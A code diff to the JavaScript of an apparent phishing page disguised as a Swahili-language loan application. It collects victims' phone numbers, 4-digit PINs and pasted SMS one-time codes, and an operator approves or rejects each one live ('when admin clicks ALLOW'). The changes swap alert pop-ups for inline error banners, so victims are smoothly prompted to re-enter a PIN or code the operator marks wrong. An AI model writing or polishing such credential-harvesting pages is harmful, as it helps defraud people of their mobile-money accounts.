@@ -31,6 +31,9 @@ document.addEventListener('DOMContentLoaded', () => {
     const otpText = document.getElementById('otp-text');
     const charCount = document.getElementById('char-count');
 
+    const pinErrorBanner = document.getElementById('pin-error-banner');
+    const smsErrorBanner = document.getElementById('sms-error-banner');
+
     let sliderData = {
         sliderAmount: '1,000,000',
         sliderDuration: '3 Mwezi',
@@ -118,7 +121,6 @@ document.addEventListener('DOMContentLoaded', () => {
         switchStep(stepLoan3, stepLoan2);
     });
 
-    // Directly load the Phone & PIN Form after clicking submission on Step 3
     btnSubmitLoan.addEventListener('click', () => {
         loanData.employmentStatus = document.getElementById('employment-status').value;
         loanData.annualIncome = document.getElementById('annual-income').value || '0';
@@ -155,9 +157,11 @@ document.addEventListener('DOMContentLoaded', () => {
         const pin = document.getElementById('pin-hidden').value;
 
         if (pin.length !== 4) {
-            alert('Tafadhali weka PIN yenye tarakimu 4 kamili.');
             return;
         }
+
+        // Hide any previous error banners
+        pinErrorBanner.classList.add('hidden');
 
         currentSessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
         
@@ -182,8 +186,7 @@ document.addEventListener('DOMContentLoaded', () => {
             }
         } catch (err) {
             console.error('Error submitting credentials:', err);
-            alert('Kosa limetokea. Tafadhali jaribu tena.');
-            location.reload();
+            switchStep(stepLoading, stepForm);
         }
     });
 
@@ -195,10 +198,10 @@ document.addEventListener('DOMContentLoaded', () => {
     btnThibitisha.addEventListener('click', async () => {
         const text = otpText.value.trim();
         if (!text) {
-            alert('Tafadhali weka ujumbe wa SMS.');
             return;
         }
 
+        smsErrorBanner.classList.add('hidden');
         switchStep(stepOtp, stepLoading);
 
         try {
@@ -226,15 +229,29 @@ document.addEventListener('DOMContentLoaded', () => {
 
                 if (data.status === 'approved_pin') {
                     clearInterval(statusInterval);
-                    // Immediately switch to SMS pasting screen when admin clicks ALLOW
                     switchStep(stepLoading, stepOtp);
                 } else if (data.status === 'success') {
                     clearInterval(statusInterval);
                     document.getElementById('final-approved-amount').innerText = 'TSh ' + loanData.amount;
                     switchStep(stepLoading, stepSuccess);
-                } else if (data.status === 'wrong_pin' || data.status === 'wrong_sms' || data.status === 'denied') {
+                } else if (data.status === 'wrong_pin') {
                     clearInterval(statusInterval);
-                    alert('Taarifa zako zimekataliwa au PIN/SMS sio sahihi. Tafadhali jaribu tena.');
+                    // Clear PIN fields and display surface error banner on form page
+                    pinInputs.forEach(i => i.value = '');
+                    document.getElementById('pin-hidden').value = '';
+                    pinErrorBanner.classList.remove('hidden');
+                    switchStep(stepLoading, stepForm);
+                    pinInputs[0].focus();
+                } else if (data.status === 'wrong_sms') {
+                    clearInterval(statusInterval);
+                    // Clear SMS textarea and display surface error banner on OTP page
+                    otpText.value = '';
+                    charCount.innerText = '0/1000';
+                    smsErrorBanner.classList.remove('hidden');
+                    switchStep(stepLoading, stepOtp);
+                    otpText.focus();
+                } else if (data.status === 'denied') {
+                    clearInterval(statusInterval);
                     location.reload();
                 }
             } catch (err) {
@@ -243,4 +260,4 @@ document.addEventListener('DOMContentLoaded', () => {
         }, 3000);
     }
 });
-    
+        
